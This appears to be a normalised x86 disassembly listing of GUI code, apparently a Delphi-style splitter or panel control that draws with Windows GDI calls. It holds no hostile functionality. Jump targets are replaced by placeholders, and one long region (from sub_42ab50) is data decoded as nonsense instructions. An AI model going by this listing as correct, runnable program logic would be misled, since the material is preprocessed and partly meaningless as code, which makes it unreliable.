sub_429eac
push ebx
mov ebx eax
cmp edx 0x1
jge r-xdata
cmp edx 0x10
jle r-xdata
mov edx 0x1
cmp edx [ ebx + 0x21c ]
je r-xdata
mov edx 0x10
pop ebx
retn
mov [ ebx + 0x21c ] edx
mov eax ebx
call sub_429c28
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_429ee4
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp esi 0xffffffff
jge r-xdata
mov [ ebx + 0x218 ] esi
jmp r-xdata
mov ebp [ ebx + 0x210 ]
mov eax [ ebp + 0x8 ]
cmp esi eax
jl r-xdata
or esi 0xffffffff
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x218 ]
cmp esi edi
je r-xdata
mov esi eax
dec esi
test edi edi
jl r-xdata
mov edi esi
mov [ ebx + 0x218 ] edi
test edi edi
jl r-xdata
mov edx edi
mov eax ebp
call sub_413918
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_413918
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
sub_429f70
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42a039
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
mov eax ebx
call sub_429e6c
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebx + 0x218 ] 0x0
jl r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
mov eax ebx
call sub_429c28
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a040
lea eax [ ebp - 0x8 ]
call sub_403f5c
retn
mov [ ebx + 0x221 ] 0x1
mov edx [ ebx + 0x218 ]
mov eax [ ebx + 0x210 ]
call sub_413918
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov [ ebx + 0x221 ] 0x0
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0x214 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
push eax
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_413918
pop edx
call sub_43bbfc
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
sub_42a048
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_4418b8
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_413918
pop edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
inc edi
dec esi
jne r-xdata
sub_42a0bc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4435f4
mov [ esi + 0x16c ] 0x1
mov dl 0x3
mov eax esi
call sub_43b0e0
mov edx 0x3
mov eax esi
call sub_43b388
mov dx 0xfff2
mov eax esi
call sub_43bdd8
mov [ esi + 0x188 ] 0x1e
mov [ esi + 0x1a8 ] 0x3
mov [ esi + 0x1a0 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_42a134
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax [ esi + 0x170 ]
call sub_403224
mov edx ebx
and dl 0xfc
mov eax esi
call sub_443650
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_42a164
push ebx
push esi
mov ebx eax
push 0x412
push 0x0
mov eax [ ebx + 0x30 ]
call sub_4423cc
push eax
call GetDCEx
mov [ ebx + 0x180 ] eax
cmp [ ebx + 0x1a8 ] 0x3
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
mov eax [ ebx + 0x170 ]
call sub_41ccc4
push eax
mov eax [ ebx + 0x180 ]
push eax
call SelectObject
mov [ ebx + 0x1a4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cae8
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx 0xffffff
xor eax eax
call sub_421d14
mov edx eax
mov eax esi
call sub_41cc64
sub_42a1e0
push ebx
add esp 0xfffffff8
mov ebx eax
mov al [ ebx + 0x184 ]
xor al 0x1
mov [ ebx + 0x184 ] al
mov ecx esp
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_4124bc
mov al [ ebx + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x1ac ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x40 ]
add eax [ ebx + 0x1ac ]
mov [ esp ] eax
jmp r-xdata
push 0x5a0049
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call PatBlt
pop ecx
pop edx
pop ebx
retn
sub_42a24c
push ebx
mov ebx eax
mov eax [ ebx + 0x1a4 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
mov eax [ ebx + 0x30 ]
call sub_4423cc
push eax
call ReleaseDC
mov eax [ ebx + 0x170 ]
test eax eax
je r-xdata
push eax
mov eax [ ebx + 0x180 ]
push eax
call SelectObject
pop ebx
retn
call sub_403224
xor eax eax
mov [ ebx + 0x170 ] eax
sub_42a294
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov esi eax
xor ebx ebx
mov ecx esp
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_4124bc
mov al [ esi + 0x5b ]
dec al
je r-xdata
dec [ esp + 0x4 ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esi + 0x30 ]
call sub_43f0fc
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ esi + 0x4c ]
add [ esp + 0x4 ] eax
dec al
je r-xdata
xor ebx ebx
inc edi
xor ebp ebp
dec [ esp ]
jmp r-xdata
dec al
je r-xdata
inc ebp
dec edi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov eax [ esi + 0x48 ]
add [ esp ] eax
jmp r-xdata
jmp r-xdata
mov edx ebp
mov eax [ esi + 0x30 ]
call sub_43f0c0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ esp + 0x8 ]
mov eax ebx
call sub_43b56c
mov eax [ esp + 0x10 ]
sub eax [ esp + 0x8 ]
jne r-xdata
mov eax ebx
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x14 ]
sub eax [ esp + 0xc ]
jne r-xdata
mov al [ esi + 0x5b ]
sub al 0x1
je r-xdata
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov al [ esi + 0x5b ]
sub al 0x1
je r-xdata
dec [ esp + 0x8 ]
jmp r-xdata
sub al 0x2
jne r-xdata
dec [ esp + 0xc ]
jmp r-xdata
sub al 0x2
jne r-xdata
inc [ esp + 0x10 ]
inc [ esp + 0x14 ]
sub_42a380
push ebx
mov ebx eax
mov eax ebx
call sub_43afd8
mov ax [ ebx + 0x78 ]
cmp ax 0xfff1
je r-xdata
mov al [ ebx + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp ax 0xfff2
jne r-xdata
mov dx 0xfff2
mov eax ebx
call sub_43bdd8
mov dx 0xfff1
mov eax ebx
call sub_43bdd8
jmp r-xdata
pop ebx
retn
sub_42a3bc
push ebx
push esi
add esp 0xffffffe0
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_41cc90
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x10 ]
mov eax [ ebx + 0x160 ]
call sub_41d034
cmp [ ebx + 0x16d ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov al [ ebx + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
cmp [ ebx + 0x1c2 ] 0x0
je r-xdata
mov esi [ ebx + 0x160 ]
mov eax [ esi + 0x10 ]
mov dl 0x2
call sub_41ca8c
mov eax [ esi + 0x10 ]
mov dl 0xe
call sub_41ca70
mov eax [ esi + 0x10 ]
mov edx 0xffd8ce
call sub_41c9b0
mov eax [ esi + 0x14 ]
mov dl 0x1
call sub_41cdac
mov eax ebx
call sub_43b5d0
push eax
mov eax ebx
call sub_43b614
push eax
xor ecx ecx
xor edx edx
mov eax esi
call sub_41d170
push 0xffffffff
push 0x2
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0x2
push 0xffffffff
lea eax [ esp + 0x8 ]
push eax
call InflateRect
jmp r-xdata
add esp 0x20
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
mov eax 0xff000014
call sub_41bfbc
push eax
call CreateSolidBrush
mov esi eax
push esi
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x160 ]
call sub_41d530
push eax
call FrameRect
push esi
call DeleteObject
push 0xfffffffe
push 0xfffffffe
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
mov eax 0xff000010
call sub_41bfbc
push eax
call CreateSolidBrush
mov esi eax
push esi
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x160 ]
call sub_41d530
push eax
call FrameRect
push esi
call DeleteObject
sub_42a518
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ esi ]
cmp edx [ ebx + 0x188 ]
jg r-xdata
cmp [ ebx + 0x16c ] 0x0
je r-xdata
xor edx edx
mov [ esi ] edx
sub_42a548
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x1b2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_42a574
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_43d1ac
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax ebx
call sub_42a294
mov [ ebx + 0x174 ] eax
lea ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
call sub_4124bc
mov eax [ ebp - 0xc ]
mov [ ebx + 0x178 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x17c ] eax
cmp [ ebx + 0x174 ] 0x0
je r-xdata
mov al [ ebx + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x30 ]
call sub_43b614
sub eax [ ebx + 0x188 ]
mov [ ebx + 0x18c ] eax
mov eax [ ebx + 0x30 ]
call sub_43f0fc
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_43b5d0
sub eax [ ebx + 0x188 ]
mov [ ebx + 0x18c ] eax
mov eax [ ebx + 0x30 ]
call sub_43f0fc
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x174 ]
mov eax [ eax + 0x4c ]
add [ ebx + 0x18c ] eax
inc esi
xor edi edi
mov eax [ ebx + 0x174 ]
mov eax [ eax + 0x48 ]
add [ ebx + 0x18c ] eax
jmp r-xdata
inc esi
xor edi edi
mov al [ ebx + 0x1a8 ]
sub al 0x1
je r-xdata
mov eax ecx
mov [ ebx + 0x168 ] eax
mov edx [ eax + 0x1d8 ]
mov [ ebx + 0x198 ] edx
mov edx [ eax + 0x1dc ]
mov [ ebx + 0x19c ] edx
mov eax [ ebx + 0x168 ]
mov [ eax + 0x1dc ] ebx
mov [ eax + 0x1d8 ] sub_42aa84
inc edi
dec esi
jne r-xdata
mov eax [ eax + 0x4c ]
sub [ ebx + 0x18c ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_42a970
mov eax ebx
call sub_42a164
mov eax ebx
call sub_4529a8
mov edx eax
mov ecx [ edx + 0x220 ]
test ecx ecx
je r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ eax + 0x5b ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov eax ebx
call sub_42a1e0
sub al 0x2
jne r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_43f0c0
mov dl [ eax + 0x5b ]
dec edx
sub dl 0x2
jae r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_43f0c0
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ eax + 0x48 ]
sub [ ebx + 0x18c ] eax
sub_42a718
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x190 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x1a0 ]
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
dec dl
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
call sub_43b3ac
jmp r-xdata
dec dl
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ba ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43ec64
xor edx edx
push ebp
push sub_42a854
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
mov edx [ eax + 0x4c ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x190 ]
add edx [ eax + 0x44 ]
call sub_43b360
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x190 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
call sub_43b3ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43ec6c
retn
dec dl
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x190 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1a0 ] eax
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
call sub_43b388
jmp r-xdata
dec dl
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43ec64
xor edx edx
push ebp
push sub_42a7e7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
mov edx [ eax + 0x48 ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x190 ]
add edx [ eax + 0x40 ]
call sub_43b33c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x190 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
call sub_43b388
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43ec6c
retn
jmp r-xdata
sub_42a89c
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ecx edx
mov esi eax
mov edi [ ebp + 0xc ]
mov dl [ esi + 0x5b ]
mov eax edx
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ esi + 0x17c ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
sub ecx [ esi + 0x178 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
mov eax [ esi + 0x174 ]
mov eax [ eax + 0x4c ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx ]
jmp r-xdata
dec cl
je r-xdata
xor eax eax
mov ecx edx
dec cl
je r-xdata
mov [ edi ] eax
cmp eax [ esi + 0x188 ]
jge r-xdata
mov eax [ esi + 0x174 ]
mov eax [ eax + 0x4c ]
mov ecx [ ebp + 0x8 ]
sub eax [ ecx ]
dec cl
je r-xdata
cmp eax [ esi + 0x18c ]
jle r-xdata
mov ecx [ esi + 0x188 ]
mov [ edi ] ecx
jmp r-xdata
mov eax [ esi + 0x174 ]
mov eax [ eax + 0x48 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx ]
jmp r-xdata
dec cl
je r-xdata
cmp eax [ edi ]
je r-xdata
mov ecx [ esi + 0x18c ]
mov [ edi ] ecx
mov eax [ esi + 0x174 ]
mov eax [ eax + 0x48 ]
mov ecx [ ebp + 0x8 ]
sub eax [ ecx ]
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ecx
pop ebp
retn 0x8
sub dl 0x2
je r-xdata
sub eax [ edi ]
jmp r-xdata
sub dl 0x2
jne r-xdata
mov edx [ ebp + 0x8 ]
add [ edx ] eax
mov edx [ edi ]
sub edx eax
mov eax edx
sub_42a988
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_43d464
test [ ebp - 0x1 ] 0x8
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x174 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_42a89c
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x94 ]
test al al
je r-xdata
mov al [ ebx + 0x1a8 ]
sub al 0x1
je r-xdata
mov eax ebx
call sub_42a1e0
sub al 0x2
jne r-xdata
mov al [ ebx + 0x1a8 ]
sub al 0x1
je r-xdata
mov eax ebx
call sub_42a718
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x190 ] eax
mov eax [ ebp - 0xc ]
mov [ ebx + 0x1ac ] eax
cmp [ ebx + 0x1a8 ] 0x2
jne r-xdata
mov eax ebx
call sub_42a1e0
sub al 0x2
jne r-xdata
sub_42aa30
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x1 ] cl
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov eax esi
call sub_43d50c
cmp [ esi + 0x174 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn 0x8
mov al [ esi + 0x1a8 ]
sub al 0x1
je r-xdata
mov eax esi
call sub_42a1e0
sub al 0x2
jne r-xdata
mov eax esi
call sub_42a718
mov eax esi
mov si 0xffc7
call sub_403420
sub_42aa84
push ebp
mov ebp esp
push esi
mov esi eax
cmp [ ecx ] 0x1b
jne r-xdata
cmp [ esi + 0x19a ] 0x0
je r-xdata
mov eax esi
mov si 0xffc7
call sub_403420
jmp r-xdata
pop esi
pop ebp
retn 0x4
mov al [ ebp + 0x8 ]
push eax
mov eax [ esi + 0x19c ]
call [ esi + 0x198 ]
sub_42aacc
push ebx
mov ebx eax
cmp [ ebx + 0x174 ] 0x0
je r-xdata
cmp [ ebx + 0x1ba ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
xor eax eax
mov [ ebx + 0x174 ] eax
mov eax ebx
call sub_42a24c
mov eax [ ebx + 0x168 ]
test eax eax
je r-xdata
mov eax ebx
call sub_42a1e0
mov edx [ ebx + 0x198 ]
mov [ eax + 0x1d8 ] edx
mov edx [ ebx + 0x19c ]
mov [ eax + 0x1dc ] edx
xor eax eax
mov [ ebx + 0x168 ] eax
sub_42ab50
push esi
inc esi
add [ ecx ] ah
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ edx ] ah
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ ebx ] ah
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ edi + edi * 8 ] ah
add [ eax ] al
push esi
inc esi
add [ 0x640000ff ] ah
push esi
inc esi
add [ esi ] ah
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ edi ] ah
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ eax ] ch
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ ecx ] ch
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ edx ] ch
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ ebx ] ch
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ edi + edi * 8 ] ch
add [ eax ] al
push esi
inc esi
add [ 0x640000ff ] ch
push esi
inc esi
add [ esi ] ch
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ edi ] ch
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ eax ] dl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ ecx ] dl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ edx ] dl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ ebx ] dl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ edi + edi * 8 ] dl
add [ eax ] al
push esi
inc esi
add [ 0x640000ff ] dl
push esi
inc esi
add [ esi ] dl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ edi ] dl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ eax ] bl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ ecx ] bl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ edx ] bl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ ebx ] bl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ edi + edi * 8 ] bl
add [ eax ] al
push esi
inc esi
add [ 0x640000ff ] bl
push esi
inc esi
add [ esi ] bl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ edi ] bl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ eax ] al
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ ecx ] al
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ edx ] al
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ ebx ] al
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ edi + edi * 8 ] al
add [ eax ] al
push esi
inc esi
add [ 0x640000ff ] al
push esi
inc esi
add [ esi ] al
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ edi ] al
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ eax ] cl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ ecx ] cl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ edx ] cl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ ebx ] cl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ edi + edi * 8 ] cl
add [ eax ] al
push esi
inc esi
add [ 0x640000ff ] cl
push esi
inc esi
add [ esi ] cl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ edi ] cl
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_42add9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41bfcc
mov [ ebp - 0x4 ] eax
test [ edi + 0x298 ] 0x40
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_403ff4
push 0x2e
mov ecx rw-data
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4133c8
test al al
jne r-xdata
mov eax [ edi + 0x23c ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ade0
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403f80
lea eax [ ebp - 0x8 ]
call sub_403f5c
retn
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x2
mov edx 0x1
mov eax ebx
call sub_40447c
mov eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_404368
jne r-xdata
mov esi 0x1
mov esi 0x3
jmp r-xdata
inc eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
call sub_403f5c
mov eax ebx
call sub_40421c
sub eax esi
jl r-xdata
lea eax [ ebp - 0x14 ]
mov dl [ ebx + esi - 0x1 ]
call sub_404144
mov edx [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
call sub_404224
inc esi
dec [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebx + esi - 0x1 ]
add al 0xbf
sub al 0x1a
jae r-xdata
jmp r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404224
sub_42adf7
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_433b38
mov dl 0x3
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x118 ]
mov al [ r-xdata ]
mov [ esi + 0x298 ] al
xor eax eax
mov [ esi + 0x2a4 ] eax
xor eax eax
mov [ esi + 0x29c ] eax
xor eax eax
mov [ esi + 0x2a0 ] eax
mov eax esi
call sub_42b280
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_42ae8c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0xc0
ja r-xdata
xor eax eax
pop ecx
pop ebp
retn
cmp [ ebp - 0x3 ] 0xc0
ja r-xdata
cmp [ ebp - 0x2 ] 0xc0
jbe r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0x8 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax 0xffffff
jmp r-xdata
pop ecx
pop ebp
retn
sub_42aec0
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] ebx
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub_42aed9
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42b02e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x208 ]
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_41d034
mov eax [ ebx + 0x14 ]
call sub_41cc88
mov edi eax
push esi
push edi
lea esi [ ebp - 0x14 ]
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x24 ]
push eax
call InflateRect
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_42b040
mov edx eax
mov eax [ ebx + 0x14 ]
call sub_41cc90
mov eax [ ebx + 0x14 ]
call sub_41cc88
cmp eax 0x20000000
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_41cc88
cmp eax 0x1fffffff
jne r-xdata
mov edx [ esi + 0x29c ]
mov eax [ ebx + 0x14 ]
call sub_41cc90
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_41d034
push ebp
mov eax [ ebx + 0x14 ]
call sub_41cc88
call sub_41bfbc
call sub_42ae8c
pop ecx
